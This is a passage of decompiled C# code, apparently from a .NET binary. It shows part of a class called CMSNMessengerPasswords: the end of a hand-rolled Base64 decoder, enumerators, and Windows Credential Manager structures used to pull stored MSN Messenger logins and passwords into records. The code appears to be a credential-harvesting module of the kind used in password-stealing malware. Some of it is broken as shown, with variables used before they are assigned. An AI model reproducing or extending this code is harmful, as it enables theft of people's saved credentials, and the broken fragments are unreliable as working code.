        numArray[(int) this.\u0024STATIC\u0024Base64Dec\u0024201E10E\u0024Enc[index2]] = checked ((byte) index2);
        checked { ++index2; }
      }
      while (index2 <= 63);
      int num1 = Strings.Len(Base64String);
      byte[] bytes = Encoding.ASCII.GetBytes(Base64String);
      byte[] arySrc1;
      byte[] arySrc2 = (byte[]) Utils.CopyArray((Array) arySrc1, (Array) new byte[checked (unchecked (num1 / 4) * 3 - 1 + 1)]);
      int num2 = Information.UBound((Array) bytes);
      int index3 = 0;
      while (index3 <= num2)
      {
        int index4;
        arySrc2[index4] = checked ((byte) ((int) numArray[(int) bytes[index3]] * 4 | unchecked ((int) numArray[(int) bytes[checked (index3 + 1)]] / 16)));
        int index5 = checked (index4 + 1);
        arySrc2[index5] = checked ((byte) ((int) (short) ((int) numArray[(int) bytes[index3 + 1]] & 15) * 16 | unchecked ((int) numArray[(int) bytes[checked (index3 + 2)]] / 4)));
        int index6 = checked (index5 + 1);
        arySrc2[index6] = checked ((byte) ((int) (short) ((int) numArray[(int) bytes[index3 + 2]] & 3) * 64 | (int) numArray[(int) bytes[index3 + 3]]));
        index4 = checked (index6 + 1);
        checked { index3 += 4; }
      }
      int num3 = bytes[checked (num1 - 2)] != (byte) 61 ? (bytes[checked (num1 - 1)] != (byte) 61 ? 0 : 1) : 2;
      return Encoding.ASCII.GetString((byte[]) Utils.CopyArray((Array) arySrc2, (Array) new byte[checked (Information.UBound((Array) arySrc2) - num3 + 1)]));
    }

    public IEnumerator<CMSNMessengerPassword> GetEnumerator()
    {
      this.Refresh();
      return (IEnumerator<CMSNMessengerPassword>) this.m_MSNPass.GetEnumerator();
    }

    IEnumerator IEnumerable.GetEnumerator1()
    {
      this.Refresh();
      return (IEnumerator) this.m_MSNPass.GetEnumerator();
    }

    private enum CRED_TYPE
    {
      GENERIC = 1,
      DOMAIN_PASSWORD = 2,
      DOMAIN_CERTIFICATE = 3,
      DOMAIN_VISIBLE_PASSWORD = 4,
      MAXIMUM = 5,
    }

    private struct DATA_BLOB
    {
      public int cbData;
      public int pbData;
    }

    private struct FILETIME
    {
      public int dwLowDateTime;
      public int dwHighDateTime;
    }

    private struct CREDENTIAL_ATTRIBUTE
    {
      public int lpstrKeyword;
      public int dwFlags;
      public int dwValueSize;
      public int lpbValue;
    }

    private struct CREDENTIAL
    {
      public int dwFlags;
      public int dwType;
      public int lpstrTargetName;
      public int lpstrComment;
      public CMSNMessengerPasswords.FILETIME ftLastWritten;
      public int dwCredentialBlobSize;
      public int lpbCredentialBlob;
      public int dwPersist;
      public int dwAttributeCount;
      public int lpAttributes;
      public int lpstrTargetAlias;
      public int lpUserName;
    }

    private struct MSNPass
    {
      public string strLogin;
      public string strPass;
      public string strTargetName;
    }
  }
}
